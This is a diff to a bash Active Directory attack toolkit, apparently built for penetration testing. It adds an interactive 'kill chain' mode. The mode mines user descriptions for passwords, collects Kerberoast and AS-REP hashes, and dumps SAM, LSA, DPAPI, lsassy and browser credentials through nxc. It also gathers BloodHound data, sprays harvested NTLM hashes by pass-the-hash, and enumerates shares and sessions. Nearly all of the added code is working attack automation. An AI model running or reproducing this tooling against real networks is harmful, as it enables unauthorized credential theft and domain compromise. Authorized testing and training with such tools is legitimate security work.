@@ -1068,6 +1068,214 @@ phase9_spray_cracked() {
 }
 
 #==============================================================================
+# CHAIN MODE — Interactive AD Kill Chain Walkthrough
+#==============================================================================
+CHAIN_MODE=false
+
+chain_prompt() {
+    local step_name="$1"
+    local step_desc="$2"
+    echo ""
+    echo -e "${BOLD}${MAGENTA}═══ ${step_name} ═══${NC}"
+    echo -e "${CYAN}${step_desc}${NC}"
+    echo ""
+    while true; do
+        echo -en "${BOLD}[P]roceed / [S]kip / [Q]uit? ${NC}"
+        read -r choice
+        case "${choice,,}" in
+            p|proceed) return 0 ;;
+            s|skip)    return 1 ;;
+            q|quit)    info "Chain aborted."; exit 0 ;;
+            *)         echo "  Enter P, S, or Q" ;;
+        esac
+    done
+}
+
+mode_chain() {
+    phase "AD Kill Chain — Interactive Walkthrough"
+    info "Domain: ${BOLD}${DOMAIN}${NC}  DC: ${BOLD}${DC_IP}${NC}  User: ${BOLD}${USER}${NC}"
+    local chain_log="${OUTDIR}/chain_log.txt"
+    echo "AD Kill Chain — $(date)" > "$chain_log"
+    echo "Domain: ${DOMAIN}  DC: ${DC_IP}  User: ${USER}" >> "$chain_log"
+    echo "" >> "$chain_log"
+
+    # Step 1: Validate foothold
+    if chain_prompt "STEP 1: VALIDATE FOOTHOLD" \
+        "Test credential against DC, check admin access, get password policy"; then
+        phase1_domain_context || {
+            error "Credential validation failed — fix before continuing"
+            return 1
+        }
+        echo "[$(date '+%H:%M:%S')] Step 1 DONE — foothold validated" >> "$chain_log"
+    fi
+
+    # Step 2: User enumeration + description mining
+    if chain_prompt "STEP 2: USER ENUM + DESCRIPTION MINING" \
+        "Enumerate all users, mine descriptions for passwords (OffSec classic)"; then
+        phase2_user_enum
+        if [[ -s "${OUTDIR}/users/suspicious_descriptions.txt" ]]; then
+            echo ""
+            echo -e "${GREEN}${BOLD}  ★ PASSWORDS FOUND IN DESCRIPTIONS:${NC}"
+            cat "${OUTDIR}/users/suspicious_descriptions.txt" | while IFS= read -r line; do
+                echo -e "    ${GREEN}${line}${NC}"
+            done
+            echo ""
+            echo -e "${YELLOW}  → Try these as passwords with sprayr.sh or manually!${NC}"
+        fi
+        echo "[$(date '+%H:%M:%S')] Step 2 DONE — user enum" >> "$chain_log"
+    fi
+
+    # Step 3: Kerberoast + AS-REP
+    if chain_prompt "STEP 3: KERBEROAST + AS-REP ROAST" \
+        "Collect crackable hashes — offline password extraction"; then
+        phase3_kerberos
+        echo ""
+        if [[ -s "${OUTDIR}/hashes/kerberoast.txt" ]]; then
+            local kcount
+            kcount=$(wc -l < "${OUTDIR}/hashes/kerberoast.txt")
+            echo -e "${GREEN}  ${kcount} Kerberoast hash(es) collected${NC}"
+            echo -e "${YELLOW}  → Crack: ./crackr.sh hashcat -m 13100 -f ${OUTDIR}/hashes/kerberoast.txt${NC}"
+        fi
+        if [[ -s "${OUTDIR}/hashes/asreproast.txt" ]]; then
+            local acount
+            acount=$(wc -l < "${OUTDIR}/hashes/asreproast.txt")
+            echo -e "${GREEN}  ${acount} AS-REP hash(es) collected${NC}"
+            echo -e "${YELLOW}  → Crack: ./crackr.sh hashcat -m 18200 -f ${OUTDIR}/hashes/asreproast.txt${NC}"
+        fi
+        echo "[$(date '+%H:%M:%S')] Step 3 DONE — kerberos attacks" >> "$chain_log"
+    fi
+
+    # Step 4: Credential looting (SAM, LSA, DPAPI, browser)
+    if chain_prompt "STEP 4: CREDENTIAL DUMP (requires admin on target)" \
+        "SAM dump, LSA secrets, DPAPI, lsassy, browser creds — needs Pwn3d access"; then
+        local loot_dir="${OUTDIR}/loot"
+        mkdir -p "$loot_dir"
+
+        info "Running credential extraction commands..."
+        local nxc_target="$DC_IP"
+
+        for dump_type in "--sam" "--lsa" "--dpapi" "-M lsassy"; do
+            local label="${dump_type//--/}"
+            label="${label//-M /}"
+            cmd_log "nxc smb ${nxc_target} ${NXC_AUTH[*]} ${dump_type}"
+            echo -e "  ${CYAN}Running: nxc smb ... ${dump_type}${NC}"
+            local dump_out
+            dump_out=$(timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" $dump_type 2>&1) || true
+            echo "$dump_out" > "${loot_dir}/${label}.txt"
+
+            # Parse credentials from output
+            echo "$dump_out" | grep -iE ":\S+:" | while IFS= read -r cred_line; do
+                success "  CRED: ${cred_line}"
+                echo "  ${cred_line}" >> "$chain_log"
+            done
+            # Log SAM hashes specifically
+            echo "$dump_out" | grep -oP '\S+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::' | while IFS=: read -r u rid lm nt _ _ _; do
+                creds_log "SAM" "$nxc_target" "$u" "$nt" "NTLM"
+            done
+        done
+
+        # Browser creds
+        cmd_log "nxc smb ${nxc_target} ${NXC_AUTH[*]} -M enum_chrome"
+        echo -e "  ${CYAN}Running: nxc smb ... -M enum_chrome${NC}"
+        timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" -M enum_chrome \
+            > "${loot_dir}/browser_creds.txt" 2>&1 || true
+
+        success "Credential dumps saved to ${loot_dir}/"
+        echo "[$(date '+%H:%M:%S')] Step 4 DONE — credential dump" >> "$chain_log"
+    fi
+
+    # Step 5: BloodHound
+    if chain_prompt "STEP 5: BLOODHOUND COLLECTION" \
+        "Collect AD relationships — import into BloodHound for attack path analysis"; then
+        phase6_bloodhound
+        echo ""
+        echo -e "${YELLOW}  → Import the zip into BloodHound${NC}"
+        echo -e "${YELLOW}  → Check: Shortest Path to Domain Admin${NC}"
+        echo -e "${YELLOW}  → Check: Kerberoastable users with path to DA${NC}"
+        echo "[$(date '+%H:%M:%S')] Step 5 DONE — BloodHound" >> "$chain_log"
+    fi
+
+    # Step 6: Pass-the-Hash with collected NTLM hashes
+    if chain_prompt "STEP 6: PASS-THE-HASH SPRAY" \
+        "Spray any NTLM hashes from Step 4 against all domain hosts"; then
+        local loot_dir="${OUTDIR}/loot"
+        local script_dir
+        script_dir="$(cd "$(dirname "$0")" && pwd)"
+        local sprayr="${script_dir}/sprayr.sh"
+        local hashes_found=false
+
+        # Collect unique hashes from loot
+        local hash_tmp
+        hash_tmp=$(mktemp)
+        for f in "${loot_dir}"/*.txt; do
+            [[ -f "$f" ]] || continue
+            grep -oP '[a-fA-F0-9]{32}:[a-fA-F0-9]{32}' "$f" 2>/dev/null || true
+        done | sort -u > "$hash_tmp"
+
+        # Also check SAM for user:hash pairs
+        local sam_users_tmp
+        sam_users_tmp=$(mktemp)
+        for f in "${loot_dir}"/*.txt; do
+            [[ -f "$f" ]] || continue
+            grep -oP '(\S+):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::' "$f" 2>/dev/null | while IFS=: read -r u rid lm nt _rest; do
+                echo "${u}|${nt}"
+            done
+        done | sort -u > "$sam_users_tmp"
+
+        if [[ -s "$sam_users_tmp" ]]; then
+            hashes_found=true
+            local pth_count
+            pth_count=$(wc -l < "$sam_users_tmp")
+            success "Found ${pth_count} user:hash pair(s) for PTH"
+            while IFS='|' read -r pth_user pth_hash; do
+                [[ -z "$pth_user" || -z "$pth_hash" ]] && continue
+                info "PTH spray: ${pth_user} (hash ${pth_hash:0:8}...)"
+                if [[ -x "$sprayr" ]]; then
+                    "$sprayr" -u "$pth_user" -H "$pth_hash" -d "$DOMAIN" -t "$DC_IP" --quick --safe || true
+                else
+                    echo -e "  ${YELLOW}Manual: nxc smb ${DC_IP} -u ${pth_user} -H ${pth_hash} -d ${DOMAIN}${NC}"
+                fi
+            done < "$sam_users_tmp"
+        fi
+
+        if [[ "$hashes_found" == false ]]; then
+            warn "No NTLM hashes found in loot — skip or get admin access first"
+        fi
+
+        rm -f "$hash_tmp" "$sam_users_tmp"
+        echo "[$(date '+%H:%M:%S')] Step 6 DONE — PTH spray" >> "$chain_log"
+    fi
+
+    # Step 7: Share and session enum
+    if chain_prompt "STEP 7: SHARES + SESSIONS" \
+        "Enumerate SMB shares (GPP, SYSVOL) and logged-on sessions"; then
+        phase7_shares
+        phase8_sessions
+        echo "[$(date '+%H:%M:%S')] Step 7 DONE — shares + sessions" >> "$chain_log"
+    fi
+
+    # Final summary
+    echo ""
+    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════${NC}"
+    echo -e "${BOLD}${GREEN}  AD CHAIN COMPLETE${NC}"
+    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════${NC}"
+    echo ""
+    echo -e "${BOLD}Key files to check:${NC}"
+    echo -e "  ${CYAN}${OUTDIR}/users/suspicious_descriptions.txt${NC}  — passwords in descriptions"
+    echo -e "  ${CYAN}${OUTDIR}/hashes/kerberoast.txt${NC}              — crack with hashcat -m 13100"
+    echo -e "  ${CYAN}${OUTDIR}/hashes/asreproast.txt${NC}              — crack with hashcat -m 18200"
+    echo -e "  ${CYAN}${OUTDIR}/loot/*.txt${NC}                         — SAM/LSA/DPAPI dumps"
+    echo -e "  ${CYAN}${OUTDIR}/bloodhound/*.zip${NC}                   — import into BloodHound"
+    echo -e "  ${CYAN}${OUTDIR}/chain_log.txt${NC}                      — this session's log"
+    echo ""
+    echo -e "${BOLD}Next:${NC}"
+    echo -e "  ${YELLOW}1. Crack any collected hashes: ./crackr.sh ...${NC}"
+    echo -e "  ${YELLOW}2. Re-spray cracked creds:     ./sprayr.sh --from-creds${NC}"
+    echo -e "  ${YELLOW}3. Check BloodHound paths:     Shortest Path to DA${NC}"
+    echo ""
+}
+
+#==============================================================================
 # SUMMARY GENERATION
 #==============================================================================
 write_summary() {
@@ -1294,6 +1502,7 @@ main() {
                 THREADS="$2"; shift 2 ;;
             --skip-bloodhound) SKIP_BLOODHOUND=true; shift ;;
             --skip-shares)     SKIP_SHARES=true; shift ;;
+            --chain)           CHAIN_MODE=true; shift ;;
             --quick)           QUICK_MODE=true; shift ;;
             --force)           FORCE_MODE=true; shift ;;
             --no-color)        disable_colors; shift ;;
@@ -1372,6 +1581,15 @@ main() {
     echo ""
 
     check_tools
+
+    # Chain mode: interactive AD kill chain walkthrough
+    if [[ "$CHAIN_MODE" == true ]]; then
+        build_nxc_auth
+        build_rpc_auth
+        build_smbc_auth
+        mode_chain
+        exit 0
+    fi
 
     # Execute phases
     if ! phase1_domain_context; then
